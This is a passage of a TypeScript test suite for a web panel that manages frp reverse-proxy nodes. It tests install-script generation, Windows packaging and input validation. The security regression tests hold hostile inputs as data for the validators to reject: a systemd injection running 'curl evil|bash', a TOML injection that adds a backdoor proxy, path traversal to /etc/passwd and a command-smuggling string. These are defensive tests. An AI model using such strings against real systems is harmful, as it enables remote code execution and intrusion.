    const a = createNode({ name: '节点A', serverAddr: 'a.example.com', installDir: '/etc/frp' });
    const b = createNode({ name: '节点B', serverAddr: 'b.example.com', installDir: '/opt/frp-b' });
    const sa = renderInstallScript(buildInstallPlan(a.id), { panelUrl: 'http://panel:34567' });
    const sb = renderInstallScript(buildInstallPlan(b.id), { panelUrl: 'http://panel:34567' });

    // Each script only touches units whose ExecStart matches its own dir.
    assert.match(sa, /ExecStart=\$INSTALL_DIR\/frpc" "\$unit_file"/);
    assert.ok(sa.includes('INSTALL_DIR="\${INSTALL_DIR:-/etc/frp}"'), 'A 应为 /etc/frp');
    assert.ok(sb.includes('INSTALL_DIR="\${INSTALL_DIR:-/opt/frp-b}"'), 'B 应为 /opt/frp-b');

    deleteNode(a.id);
    deleteNode(b.id);
  });

  await test('重装时 frpc 二进制同版本可跳过下载（幂等）', () => {
    const n = createNode({ name: '幂等节点', serverAddr: 'i.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:34567' });
    assert.match(script, /已安装 frpc v\$CURRENT，跳过下载/);
    assert.match(script, /NEED_DOWNLOAD=1/);
    deleteNode(n.id);
  });

  await test('卸载模式会同时删除配置与备份', () => {
    const n = createNode({ name: '卸载节点', serverAddr: 'x.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:34567' });
    assert.match(script, /--uninstall/);
    assert.match(script, /rm -f "\$INSTALL_DIR\/frpc" "\$INSTALL_DIR\/frpc\.toml"/);
    deleteNode(n.id);
  });


  console.log('\n\x1b[1m[12] 仅定制版分发（已取消原版支持）\x1b[0m');

  await test('定制版版本号带后缀，与压缩包名解耦', () => {
    assert.equal(customVersionString('0.71.0'), '0.71.0-console');
    assert.equal(customVersionString('0.71.0-console'), '0.71.0-console', '不应重复追加');
    assert.equal(baseVersionOf('0.71.0-console'), '0.71.0');
    assert.equal(isCustomVersion('0.71.0-console'), true);
  });

  await test('安装计划始终使用定制版', () => {
    const n = createNode({ name: '定制节点', serverAddr: 'c.example.com' });
    updateSettings({ publicBaseUrl: 'http://panel.example.com:34567' });
    const plan = buildInstallPlan(n.id);
    assert.equal(plan.variant, 'custom');
    assert.equal(plan.frpVersion, '0.71.0-console');
    assert.equal(plan.customBase, 'http://panel.example.com:34567/custom-frp');
    deleteNode(n.id);
  });

  await test('节点级自建镜像优先于面板端点', () => {
    const n = createNode({
      name: '镜像节点',
      serverAddr: 'm.example.com',
      downloadBase: 'https://my.mirror/frp',
    });
    updateSettings({ publicBaseUrl: 'http://panel.example.com:34567' });
    const plan = buildInstallPlan(n.id);
    assert.equal(plan.downloadBase, 'https://my.mirror/frp');
    assert.equal(plan.customBase, '', '设了自建镜像就不再指向面板');
    deleteNode(n.id);
  });

  await test('安装脚本不含 GitHub 下载回退', () => {
    updateSettings({ publicBaseUrl: 'http://panel:34567' });
    const n = createNode({ name: '无回退', serverAddr: 'n.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:34567' });

    // 不应出现上游 release 下载地址（Documentation 链接可以保留）
    assert.ok(!script.includes('releases/download'), '不应下载上游预编译包');
    assert.ok(!script.includes('GITHUB_PROXY'), '不应再有 GitHub 代理逻辑');
    assert.ok(!/--gh-proxy/.test(script), '不应再有 --gh-proxy 参数');
    // 必须有明确报错而非静默回退
    assert.match(script, /未配置面板公网地址/, '无地址时应明确报错');
    deleteNode(n.id);
  });

  await test('压缩包名使用基础版本（与镜像结构兼容）', () => {
    updateSettings({ publicBaseUrl: 'http://panel:34567' });
    const n = createNode({ name: '命名检查', serverAddr: 'x.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:34567' });
    assert.match(script, /BASE_VERSION="\$\{FRP_VERSION%%-\*}"/);
    assert.match(script, /ASSET="frp_\$\{BASE_VERSION\}_linux_\$\{ARCH\}\.tar\.gz"/);
    assert.match(script, /FRP_VERSION="\$\{FRP_VERSION:-0\.71\.0-console\}"/);
    deleteNode(n.id);
  });

  await test('预构建包能被分发端点识别且命名规范', () => {
    const dir = path.dirname(CUSTOM_SCRIPT);
    const distDir = path.join(dir, 'dist');
    if (!fs.existsSync(distDir)) {
      console.log('    (无预构建 dist，跳过)');
      return;
    }
    const files = fs.readdirSync(distDir).filter((f) => f.endsWith('.tar.gz'));
    assert.ok(files.length > 0, '应存在预构建压缩包');
    for (const f of files) {
      assert.match(f, /^frp_\d+\.\d+\.\d+_linux_[A-Za-z0-9_]+\.tar\.gz$/, `命名应匹配分发包格式: ${f}`);
    }
  });

  await test('预构建覆盖安装脚本支持的全部架构（防止漏构建）', () => {
    const distDir = path.join(path.dirname(CUSTOM_SCRIPT), 'dist');
    if (!fs.existsSync(distDir)) {
      console.log('    (无预构建 dist，跳过)');
      return;
    }
    const built = new Set(
      fs.readdirSync(distDir)
        .map((f) => f.match(/^frp_\d+\.\d+\.\d+_linux_([A-Za-z0-9_]+)\.tar\.gz$/)?.[1])
        .filter(Boolean) as string[],
    );

    // Every arch the installer can map must have a matching tarball, otherwise
    // such a node would fail to install.
    const installerArches = new Set<string>();
    for (const uname of ['x86_64', 'aarch64', 'armv7l', 'armv6l', 'i686', 'loongarch64', 'riscv64']) {
      const mapped = archFromUname(uname);
      assert.ok(mapped, `安装脚本架构映射缺失: ${uname}`);
      installerArches.add(mapped);
    }

    const missing = [...installerArches].filter((a) => !built.has(a)).sort();
    assert.deepEqual(
      missing,
      [],
      `以下架构安装脚本会请求但未预构建，对应节点会安装失败: ${missing.join(', ')}。请用 --all-arches 构建。`,
    );
  });

  await test('架构映射表在面板与安装脚本间一致', () => {
    // hostAssetArch and archFromUname must agree for every supported arch.
    for (const a of SUPPORTED_ARCHES) {
      assert.equal(hostAssetArch(a === 'amd64' ? 'x64' : a === '386' ? 'ia32' : a), a);
    }
    assert.equal(archFromUname('x86_64'), 'amd64');
    assert.equal(archFromUname('loongarch64'), 'loong64');
    assert.equal(archFromUname('riscv64'), 'riscv64');
    assert.equal(archFromUname('unknown-arch'), null);
    assert.ok(SUPPORTED_ARCHES.includes('loong64'), '应支持 loong64');
    assert.ok(SUPPORTED_ARCHES.includes('riscv64'), '应支持 riscv64');
  });

  await test('变体描述只描述定制版', () => {
    const d = describeVariant();
    assert.equal(d.label, '定制版');
    assert.ok(d.features.some((f) => /diag/.test(f)));
    assert.ok(d.features.some((f) => /心跳/.test(f)));
    assert.ok(d.features.some((f) => /审计/.test(f)));
  });



  console.log('\n\x1b[1m[13] 安全加固回归\x1b[0m');

  await test('TOML 注释换行注入被拦截（节点名无法伪造 [[proxies]]）', () => {
    const evil = '正常名\n[[proxies]]\nname = "backdoor"\ntype = "tcp"\nlocalPort = 6379\nremotePort = 16379';
    const w = new TomlWriter();
    w.comment(`Node: ${evil} (#1)`);
    w.kv('serverAddr', 'x');
    const out = w.toString();
    // 注入的 [[proxies]] 必须仍在注释行内
    for (const line of out.split('\n')) {
      if (line.includes('[[proxies]]')) {
        assert.ok(line.trimStart().startsWith('#'), `注入行未处于注释中: ${JSON.stringify(line)}`);
      }
    }
    // 无任何裸表段
    assert.ok(!/^\[\[?/m.test(out), '输出不得包含裸表段');
  });

  await test('installDir 注入 systemd unit 被拦截', () => {
    const evils = [
      '/etc/frp\nExecStartPre=/bin/bash -c "curl evil|bash"',
      'relative/path',
      '/a/../b',
      '/a//b',
      '  ', // 空（应回退默认值，不算错误——单独处理）
    ];
    for (const e of evils.slice(0, 4)) {
      assert.throws(() => createNode({ name: 'x', serverAddr: 'x', installDir: e }), /安装目录|绝对路径/, `应拒绝: ${e}`);
    }
    // 正常值
    const n = createNode({ name: 'dir-ok', serverAddr: 'x', installDir: '/opt/my-frpc' });
    assert.equal(n.installDir, '/opt/my-frpc');
    deleteNode(n.id);
  });

  await test('frp 版本号注入被拦截（URL/文件名穿越）', () => {
    const n = createNode({ name: 'ver', serverAddr: 'x', frpcVersion: '0.71.0/../../../evil' });
    assert.throws(() => buildInstallPlan(n.id), /版本号格式不合法/, '路径穿越版本号应被拒绝');
    deleteNode(n.id);
    // 合法值不受影响
    const n2 = createNode({ name: 'ver-ok', serverAddr: 'x', frpcVersion: '0.71.0-console' });
    const plan = buildInstallPlan(n2.id);
    assert.equal(plan.frpVersion, '0.71.0-console');
    deleteNode(n2.id);
  });

  await test('节点名/备注长度上限', () => {
    assert.throws(() => createNode({ name: 'x'.repeat(101), serverAddr: 'x' }), /节点名称 长度/);
    assert.throws(() => createNode({ name: 'ok', serverAddr: 'x', remark: 'y'.repeat(501) }), /备注 长度/);
    // 边界值
    const n = createNode({ name: 'x'.repeat(100), serverAddr: 'x', remark: 'y'.repeat(500) });
    deleteNode(n.id);
  });

  await test('frps 地址长度上限', () => {
    assert.throws(() => updateSettings({ frpsAddr: 'a'.repeat(254) }), /frps 地址过长/);
  });

  console.log('\n\x1b[1m[13] frps 对外地址与节点继承\x1b[0m');

  await test('前端必须同步 frps 地址（预取 + 保存后刷新缓存）', () => {
    const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
    const appJs = fs.readFileSync(path.join(root, 'public/app.js'), 'utf8');

    // 节点表单要显示「留空则继承」的值，所以：
    //  1) 启动时预取（用户可能直接进「节点管理」，不会先打开设置页）
    assert.ok(
      /bootApp[\s\S]{0,500}system\/info[\s\S]{0,300}FRPS_ADDR\s*=/.test(appJs),
      'bootApp 应预取 frps 对外地址',
    );
    //  2) 保存设置后立即同步本地缓存，否则改完地址新建节点会看到过期值
    assert.ok(
      /设置已保存[\s\S]{0,300}FRPS_ADDR\s*=\s*val\('s_frpsAddr'\)/.test(appJs),
      '保存设置后应同步 FRPS_ADDR',
    );
    //  3) 设置页加载时也要赋值
    assert.ok(/FRPS_ADDR\s*=\s*s\.frpsAddr/.test(appJs), '加载设置时应赋值 FRPS_ADDR');
    //  4) 节点表单把继承值展示给用户
    assert.ok(appJs.includes('当前继承值'), '节点表单应展示当前继承值');
  });

  await test('frps 地址可保存并读回', () => {
    updateSettings({ frpsAddr: 'frp.example.com' });
    assert.equal(getSettings().frpsAddr, 'frp.example.com');
  });

  await test('frps 地址规范化：剥掉协议、端口与路径', () => {
    // 用户常整段粘贴 URL，应宽容处理
    updateSettings({ frpsAddr: 'https://frp.example.com:37001/some/path' });
    assert.equal(getSettings().frpsAddr, 'frp.example.com');

    updateSettings({ frpsAddr: 'http://1.2.3.4:37001' });
    assert.equal(getSettings().frpsAddr, '1.2.3.4');

    // 纯 IP / 域名
    updateSettings({ frpsAddr: '  203.0.113.7  ' });
    assert.equal(getSettings().frpsAddr, '203.0.113.7');

    // IPv6 保留方括号
    updateSettings({ frpsAddr: '[2001:db8::1]:37001' });
    assert.equal(getSettings().frpsAddr, '[2001:db8::1]');
  });

  await test('frps 地址拒绝非法内容', () => {
    assert.throws(() => updateSettings({ frpsAddr: 'bad host name' }), /不能包含空格/);
    assert.throws(() => updateSettings({ frpsAddr: 'evil;rm' }), /只能包含/);
    assert.throws(() => updateSettings({ frpsAddr: 'a|b' }), /只能包含/);
    assert.throws(() => updateSettings({ frpsAddr: 'a..b' }), /格式不正确/);
  });

  await test('节点 frps 地址留空时继承 frps 设置', () => {
    updateSettings({ frpsAddr: 'frp.example.com', bindPort: 37001 });
    const n = createNode({ name: '继承节点', serverAddr: '' });
    const plan = buildInstallPlan(n.id);
    assert.equal(plan.serverAddr, 'frp.example.com', '应继承 frps 设置里的地址');
    assert.equal(plan.serverPort, 37001, '端口应继承 bindPort');
    // 生成的 frpc.toml 也要用上继承值
    assert.match(plan.frpcToml, /serverAddr = "frp\.example\.com"/);
    deleteNode(n.id);
  });

  await test('节点自填地址优先于继承值', () => {
    updateSettings({ frpsAddr: 'frp.example.com' });
    const n = createNode({ name: '自填节点', serverAddr: 'my.domain.com' });
    assert.equal(buildInstallPlan(n.id).serverAddr, 'my.domain.com');
    deleteNode(n.id);
  });

  await test('frps 地址未设置且节点留空时给出明确占位提示', () => {
    updateSettings({ frpsAddr: '' });
    const n = createNode({ name: '无地址节点', serverAddr: '' });
    const plan = buildInstallPlan(n.id);
    assert.ok(plan.serverAddr.includes('请填写'), '应提示用户补填，而不是生成空地址配置');
    deleteNode(n.id);
    updateSettings({ frpsAddr: 'frp.example.com' });
  });

  await test('修改 frps 地址后所有继承节点的配置同步生效', () => {
    updateSettings({ frpsAddr: '1.1.1.1' });
    const n = createNode({ name: '同步节点', serverAddr: '' });
    assert.equal(buildInstallPlan(n.id).serverAddr, '1.1.1.1');
    // 改一次全局生效，无需逐个改节点
    updateSettings({ frpsAddr: '2.2.2.2' });
    assert.equal(buildInstallPlan(n.id).serverAddr, '2.2.2.2');
    deleteNode(n.id);
  });

  console.log('\n\x1b[1m[14] 二进制直链托管（OpenList 等）\x1b[0m');

  await test('直链映射保存并能读回（含签名参数）', () => {
    const url = 'http://mirror.example.com:23613/d/frp/frp_0.71.0_linux_amd64.tar.gz?sign=EXAMPLE_SIGNATURE:0';
    updateSettings({ assetMirrors: { 'frp_0.71.0_linux_amd64.tar.gz': url } });
    const s = getSettings();
    assert.equal(s.assetMirrors['frp_0.71.0_linux_amd64.tar.gz'], url, '签名参数必须完整保留');
  });

  await test('直链映射拒绝非法资产名（防路径穿越）', () => {
    assert.throws(
      () => updateSettings({ assetMirrors: { '../../etc/passwd': 'http://evil/x' } }),
      /不支持的资产名/,
    );
    assert.throws(
      () => updateSettings({ assetMirrors: { 'evil.sh': 'http://evil/x' } }),
      /不支持的资产名/,
    );
  });

  await test('直链映射拒绝非 http(s) 协议', () => {
    assert.throws(
      () => updateSettings({ assetMirrors: { 'frp_0.71.0_linux_amd64.tar.gz': 'file:///etc/passwd' } }),
      /必须以 http/,
    );
    assert.throws(
      () => updateSettings({ assetMirrors: { 'frp_0.71.0_linux_amd64.tar.gz': 'not-a-url' } }),
      /不是合法 URL/,
    );
  });

  await test('安装脚本嵌入直链并带自动回退', () => {
    const url = 'http://mirror.example.com:23613/d/115/frp/frp_0.71.0_linux_amd64.tar.gz?sign=abc:0';
    updateSettings({
      publicBaseUrl: 'http://panel:37000',
      assetMirrors: { 'frp_0.71.0_linux_amd64.tar.gz': url },
    });
    const n = createNode({ name: '直链节点', serverAddr: 'm.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:37000' });

    // 直链以 base64 传输，解码后应能还原
    const m = script.match(/cat <<'ASSET_MIRRORS_B64_EOF'\n([\s\S]*?)\nASSET_MIRRORS_B64_EOF/);
    assert.ok(m, '脚本应内嵌直链映射');
    const decoded = JSON.parse(Buffer.from(m![1]!.replace(/\n/g, ''), 'base64').toString('utf8'));
    assert.equal(decoded['frp_0.71.0_linux_amd64.tar.gz'], url, '直链应能原样还原');

    // 必须是「候选列表 + 逐个尝试」的结构，保证失败自动回退
    assert.ok(script.includes('CANDIDATES+='), '应构建候选下载地址列表');
    assert.ok(script.includes('该地址不可用，尝试下一个来源'), '失败应回退到下一个来源');
    // 日志不能泄露签名
    assert.ok(!script.includes('log "下载 $CAND"'), '日志应隐藏签名参数');

    // 清理，避免影响后续用例
    updateSettings({ assetMirrors: {} });
    deleteNode(n.id);
  });

  await test('前端保存设置必须提交 assetMirrors（否则直链丢失）', () => {
    // 这是一个真实踩过的坑：collectSettings() 漏了 assetMirrors，
    // 导致「保存后刷新，直链全部消失」。这里用源码断言防止再犯。
    const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
    const appJs = fs.readFileSync(path.join(root, 'public/app.js'), 'utf8');

    const fn = appJs.match(/function collectSettings\(\)[\s\S]*?\n  \}/);
    assert.ok(fn, '应能找到 collectSettings 定义');
    assert.ok(
      /assetMirrors:\s*collectMirrorRows\(\)/.test(fn![0]),
      'collectSettings() 必须包含 assetMirrors: collectMirrorRows()，否则保存时直链不会被提交',
    );

    // 加载设置时必须回显，否则用户以为没保存上
    const loadFn = appJs.match(/renderMirrorRows\(s\.assetMirrors/);
    assert.ok(loadFn, '加载设置时应回显已保存的直链');
  });

  await test('静态资源带版本戳并配置缓存头（避免新旧脚本错配）', () => {
    const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
    const server = fs.readFileSync(path.join(root, 'src/server.ts'), 'utf8');
    // 首页渲染时给 app.js / style.css 打版本戳
    assert.ok(/\.replace\('src="\/app\.js"'/.test(server), '首页应给 app.js 打版本戳');
    assert.ok(/\.replace\('href="\/style\.css"'/.test(server), '首页应给 style.css 打版本戳');
    // 用 onSend 而非 setHeaders（后者会被 @fastify/static 覆盖）
    assert.ok(server.includes("addHook('onSend'"), '应使用 onSend 钩子设置缓存头');
    assert.ok(server.includes('immutable'), '静态资源应使用 immutable 长缓存');
  });

  await test('安装脚本不得含 set -e 陷阱（[[ ]] && 会静默退出）', () => {
    updateSettings({
      publicBaseUrl: 'http://panel:37000',
      assetMirrors: { 'frp_0.71.0_linux_amd64.tar.gz': 'http://mirror/x.tar.gz?sign=a:0' },
    });
    const n = createNode({ name: 'sete', serverAddr: 'se.example.com' });
    const script = renderInstallScript(buildInstallPlan(n.id), { panelUrl: 'http://panel:37000' });

    assert.ok(script.includes('set -euo pipefail'), '脚本应启用 set -e');

    // 形如 `[[ ... ]] && cmd` 的独立语句在条件为假时返回非 0，
    // 配合 set -e 会让整个脚本静默退出——未配置直链的架构就装不上了。
    // 允许 `|| die` / `|| continue` / `|| true` 这类「失败即终止或跳过」的安全写法。
    const offenders: string[] = [];
    for (const line of script.split('\n')) {
      const t = line.trim();
      if (!/^\[\[.*\]\]\s*(&&|\|\|)/.test(t)) continue;
      if (/\|\|\s*(die|continue|true)\b/.test(t)) continue;
      offenders.push(t);
    }
    assert.deepEqual(offenders, [], `存在 set -e 陷阱: ${offenders.join(' | ')}`);

    // 未配置直链的资产必须能走到面板回退（候选列表用 if 构建）
    assert.ok(script.includes('if [[ -n "$ASSET_MIRROR" ]]; then CANDIDATES+='), '候选列表应用 if 构建');
    updateSettings({ assetMirrors: {} });
    deleteNode(n.id);
  });

  await test('未配置直链的资产仅走面板分发', () => {
    updateSettings({ assetMirrors: {}, publicBaseUrl: 'http://panel:37000' });
    const n = createNode({ name: '无直链节点', serverAddr: 'no.example.com' });
    const plan = buildInstallPlan(n.id);
    assert.deepEqual(plan.assetMirrors, {}, '不应凭空产生直链');
    assert.ok(plan.customBase, '应回退到面板分发');
    deleteNode(n.id);
  });

  console.log('\n\x1b[1m[15] Windows 节点支持\x1b[0m');

  await test('Windows 包结构与内容正确', () => {
    const n = createNode({ name: 'Windows节点', serverAddr: 'w.example.com' });
    // 端口需同时满足：落在当前 allowPorts 内 + 未被占用（前面的用例可能已分配）
    const cfg = getSettings();
    const stats = poolStats();
    const used = new Set(stats.usedPorts);
    let port: number | null = null;
    for (const r of cfg.allowPorts) {
      for (let p = r.start; p <= r.end; p++) {
        if (!used.has(p)) { port = p; break; }
      }
      if (port !== null) break;
    }
    assert.ok(port !== null, '需要一个空闲端口用于本用例');
    createProxy(n.id, {
      name: 'rdp', type: 'tcp', localIp: '127.0.0.1', localPort: 3389,
      remotePortRandom: false, remotePort: port,
    });
    const plan = buildInstallPlan(n.id);
    // 用一个占位的 Windows PE 头（MZ）代替真实 exe，验证打包逻辑本身
    const fakeExe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(64)]);
    const pkg = buildWindowsPackage(plan, fakeExe, { panelUrl: 'http://panel:37000' });

    assert.match(pkg.name, /^frp-console-frpc-\d+-windows-amd64\.zip$/);
    // ZIP 魔数校验
    assert.equal(pkg.buffer.slice(0, 2).toString('latin1'), 'PK', '应为 ZIP 格式');

    // 解析中央目录，确认条目齐全
    const names: string[] = [];
    let i = 0;
    while ((i = pkg.buffer.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]), i)) !== -1) {
      const nlen = pkg.buffer.readUInt16LE(i + 28);
      names.push(pkg.buffer.slice(i + 46, i + 46 + nlen).toString('utf8'));
      i += 4;
    }
    const root = `frp-console-frpc-${n.id}`;
    for (const want of ['/', '/frpc.exe', '/frpc.toml', '/frpc-manage.cmd', '/README.txt']) {
      assert.ok(names.includes(root + want), `包内缺少 ${want}，实际: ${names.join(', ')}`);
    }
    // 文件名必须全为 ASCII（中文名在部分解压工具下会乱码）
    for (const nm of names) {
      // eslint-disable-next-line no-control-regex
      assert.ok(!/[^\x00-\x7F]/.test(nm), `包内文件名应为 ASCII: ${nm}`);
    }
    deleteNode(n.id);
  });

  await test('Windows 管理脚本覆盖安装/启动/停止/自启/卸载', () => {
    const n = createNode({ name: 'Win脚本', serverAddr: 'w2.example.com' });
    const plan = buildInstallPlan(n.id);
    const cmd = renderWindowsManageCmd(plan, 'http://panel:37000');

    // 换行必须是 CRLF
    const bareLf = (cmd.match(/(?<!\r)\n/g) || []).length;
    assert.equal(bareLf, 0, 'Windows 脚本必须为 CRLF 换行');

    for (const kw of ['install', 'start', 'stop', 'restart', 'status', 'autostart', 'uninstall']) {
      assert.ok(cmd.includes(kw), `管理脚本应支持 ${kw}`);
    }
    // 开机自启走任务计划程序，停止用 taskkill
    assert.ok(cmd.includes('schtasks'), '应使用 schtasks 设置开机自启');
    assert.ok(cmd.includes('taskkill'), '应使用 taskkill 停止进程');
    // 必须切到 936（GBK）：脚本本身就是 GBK 编码，代码页若不匹配会乱码
    assert.ok(cmd.includes('chcp 936'), '应切换 GBK 代码页（cp936）');
    deleteNode(n.id);
  });

  await test('Windows 脚本为交互式菜单（无参数时按 1-7 选择）', () => {
    const n = createNode({ name: '菜单节点', serverAddr: 'm.example.com' });
    const cmd = renderWindowsManageCmd(buildInstallPlan(n.id), 'http://panel:37000');

    // 菜单项
    for (const item of ['[1]', '[2]', '[3]', '[4]', '[5]', '[6]', '[7]', '[0]']) {
      assert.ok(cmd.includes(item), `菜单应包含选项 ${item}`);
    }
    assert.ok(/set \/p "CHOICE=/.test(cmd), '应提示用户输入序号');
    assert.ok(cmd.includes('goto :menu') || cmd.includes(':menu'), '应有菜单循环');
    assert.ok(cmd.includes('pause_return'), '操作后应可返回菜单');
    assert.ok(cmd.includes('无效输入'), '应处理无效输入');

    // 带参数时跳过菜单直接执行
    assert.ok(cmd.includes(':dispatch'), '应支持命令行参数直接执行');
    deleteNode(n.id);
  });

  await test('Windows .cmd 必须是 GBK 编码（UTF-8 会导致命令粘连报错）', () => {
    const n = createNode({ name: '编码节点', serverAddr: 'enc.example.com' });
    const plan = buildInstallPlan(n.id);
    const { files } = buildWindowsPackageFiles(plan, Buffer.from('MZ'), {
      panelUrl: 'http://panel:37000',
      includeReadme: false,
    });

    const cmd = files.find((f) => f.name.endsWith('frpc-manage.cmd'));
    assert.ok(cmd, '应包含 frpc-manage.cmd');

    // 关键：文件不能是 UTF-8。中文的 UTF-8 字节会被 cmd.exe 按 GBK 解析，
    // 吞掉行尾 CR，导致 '[7]' is not recognized 这类错误。
    const gbkText = iconv.decode(cmd!.data, 'gbk');
    assert.ok(gbkText.includes('卸载'), 'GBK 解码后中文应完整');
    assert.ok(!gbkText.includes('\uFFFD'), 'GBK 解码不应出现替换字符');

    // 且必须能用 GBK 无损还原成原始 UTF-8 文本
    assert.equal(gbkText.replace(/\r\n/g, '\n'), cmd!.text!.replace(/\r\n/g, '\n'));

    // 不含 BOM（cmd.exe 会把 BOM 当作命令的一部分）
    assert.notEqual(cmd!.data[0], 0xef, '.cmd 不得带 UTF-8 BOM');

    // chcp 之前必须是纯 ASCII：英文系统上代码页不是 936，
    // 若 chcp 之前就有中文输出，会先乱码（自举问题）
    const mLines = cmd!.text!.replace(/\r\n/g, '\n').split('\n');
    const chcpIdx = mLines.findIndex((l) => l.trim().startsWith('chcp'));
    assert.ok(chcpIdx >= 0, '应设置代码页');
    const beforeChcp = mLines.slice(0, chcpIdx).filter((l) => /[^\x00-\x7F]/.test(l));
    assert.deepEqual(beforeChcp, [], `chcp 之前不得有非 ASCII: ${beforeChcp}`);

    // 每一行都必须以 CRLF 结束，且 GBK 下 CR 不被吞掉
    const raw = cmd!.data;
    const lfCount = raw.filter((b: number) => b === 0x0a).length;
    const crCount = raw.filter((b: number) => b === 0x0d).length;
    assert.equal(lfCount, crCount, 'CR 与 LF 数量必须相等（行结构完整）');
    deleteNode(n.id);
  });

  await test('Windows 脚本注入心跳环境变量（否则面板显示离线）', () => {
    const n = createNode({ name: '心跳节点', serverAddr: 'hb.example.com' });
    const plan = buildInstallPlan(n.id);
    const panel = 'http://frp.example.com:37000';

    // 管理脚本（交互式启动路径）
    const manage = renderWindowsManageCmd(plan, panel);
    assert.ok(manage.includes('FRP_CONSOLE_PANEL_URL='), '管理脚本应设置心跳地址');
    assert.ok(manage.includes('FRP_CONSOLE_INSTALL_TOKEN='), '管理脚本应设置安装 token');
    assert.ok(manage.includes(`FRP_CONSOLE_INSTALL_TOKEN=${n.installToken}`), 'token 应为该节点的');
    assert.ok(manage.includes(panel), '应包含面板地址');

    // 启动器（开机自启路径）——计划任务由系统启动，拿不到管理脚本的变量，
    // 所以启动器本身也必须自带这些变量。
    const start = renderWindowsStartCmd(plan, panel);
    assert.ok(start.includes('FRP_CONSOLE_PANEL_URL='), '启动器应设置心跳地址');
    assert.ok(start.includes(`FRP_CONSOLE_INSTALL_TOKEN=${n.installToken}`), '启动器应设置 token');
    deleteNode(n.id);
  });

  await test('开机自启任务用 XML 定义并含启动器占位符', () => {
    const n = createNode({ name: '自启节点', serverAddr: 'auto.example.com' });
    const plan = buildInstallPlan(n.id);
    const xml = renderWindowsTaskXml(plan);

    // 必须是合法 XML，且带 LogonTrigger + 最高权限
    assert.ok(xml.startsWith('<?xml'), '应为 XML 文档');
    assert.ok(xml.includes('<LogonTrigger>'), '应在登录时触发');
    assert.ok(xml.includes('<RunLevel>HighestAvailable</RunLevel>'), '应以最高权限运行');
    assert.ok(xml.includes(LAUNCHER_PLACEHOLDER), '启动器路径应为占位符（解压前未知）');

    // 占位符必须在注册前被替换，且管理脚本用 PowerShell 做替换
    const manage = renderWindowsManageCmd(plan, 'http://panel:37000');
    assert.ok(manage.includes(LAUNCHER_PLACEHOLDER), '管理脚本应替换占位符');
    assert.ok(manage.includes('schtasks /Create'), '应注册计划任务');
    assert.ok(!/schtasks \/Create[^\n]*\/TR/.test(manage), '应使用 /XML 而非易错的 /TR 引号');
    deleteNode(n.id);
  });

  await test('需要管理员权限的操作会自动请求提权', () => {
    const n = createNode({ name: '提权节点', serverAddr: 'ele.example.com' });
    const cmd = renderWindowsManageCmd(buildInstallPlan(n.id), 'http://panel:37000');
    // 双击运行时没有管理员权限，脚本应检测并弹 UAC 而不是静默失败
    assert.ok(cmd.includes('S-1-16-12288'), '应用语言无关的方式检测管理员');
    assert.ok(cmd.includes('-Verb RunAs'), '应通过 PowerShell 请求提权');
    deleteNode(n.id);
  });

  await test('Windows 脚本不得用 call 调用含 goto 的子程序（CMD 陷阱）', () => {
    const n = createNode({ name: '陷阱检查', serverAddr: 'trap.example.com' });
    const cmd = renderWindowsManageCmd(buildInstallPlan(n.id), 'http://panel:37000');
    const lines = cmd.replace(/\r\n/g, '\n').split('\n');
    const realCalls = lines.filter((l) => l.includes('call :stop') && !l.trim().startsWith('REM'));
    // CMD 中 call 进的子程序若内部 goto，会直接跳走、跳过后续语句，
    // 所以 :stop 的逻辑必须内联，不能用 call :stop。
    assert.deepEqual(realCalls, [], `不得出现实际 call :stop（会跳过后续逻辑）: ${realCalls}`);
    deleteNode(n.id);
  });

  await test('Windows 配置与 frps 的 tcpMux 保持一致', () => {
    const n = createNode({ name: 'WinMux', serverAddr: 'w3.example.com' });
    updateSettings({ tcpMux: true, publicBaseUrl: 'http://panel:37000' });
    assert.match(buildInstallPlan(n.id).frpcToml, /transport\.tcpMux = true/);
    updateSettings({ tcpMux: false });
    assert.match(buildInstallPlan(n.id).frpcToml, /transport\.tcpMux = false/);
    updateSettings({ tcpMux: true });
    deleteNode(n.id);
  });

  await test('分发端点同时接受 linux tar.gz 与 windows zip', () => {
    // 仅校验文件名正则（端点实现在 server 层，这里验证命名约定一致）
    const linux = 'frp_0.71.0_linux_amd64.tar.gz';
    const win = 'frp_0.71.0_windows_amd64.zip';
    const re = /^frp_\d+\.\d+\.\d+_(linux|windows)_[A-Za-z0-9_]+\.(tar\.gz|zip)$/;
    assert.ok(re.test(linux), 'linux 包名应匹配');
    assert.ok(re.test(win), 'windows 包名应匹配');
    assert.ok(!re.test('../../../etc/passwd'), '不得接受路径穿越');
  });

  console.log('\n\x1b[1m[16] 服务管理后端（systemd / supervisor / none）\x1b[0m');

  await test('后端自动探测：裸机为 systemd，容器为 supervisor', async () => {
    // This host has systemd; the container test is covered by docker tests.
    resetServiceBackend();
    const be = await getServiceBackend({
      force: '',
      unitDir: '/tmp/frp-test-units',
      supervisorIncludeDir: '/tmp/frp-test-supervisor',
      supervisorLogDir: '/tmp/frp-test-logs',
      supervisorctl: 'supervisorctl',
      binPath: '/usr/local/bin/frps',
      configPath: '/etc/frp/frps.toml',
      serviceName: 'frps-test',
    });
    if (fs.existsSync('/run/systemd/system')) {
      assert.equal(be.kind, 'systemd', '有 systemd 时应选择 systemd');
    } else {
      assert.ok(['supervisor', 'none'].includes(be.kind), `无 systemd 时应回退，实际 ${be.kind}`);
    }
  });

  await test('可强制指定后端（容器场景）', async () => {
    resetServiceBackend();
    const be = await getServiceBackend({
      force: 'supervisor',
      unitDir: '/tmp/frp-test-units',
      supervisorIncludeDir: '/tmp/sup-test',
      supervisorLogDir: '/tmp/sup-test-log',
      supervisorctl: 'supervisorctl',
      binPath: '/usr/local/bin/frps',
      configPath: '/etc/frp/frps.toml',
      serviceName: 'frps',
    });
    assert.equal(be.kind, 'supervisor');
    // 定义路径必须是 supervisor 的 include 文件，而不是 systemd unit
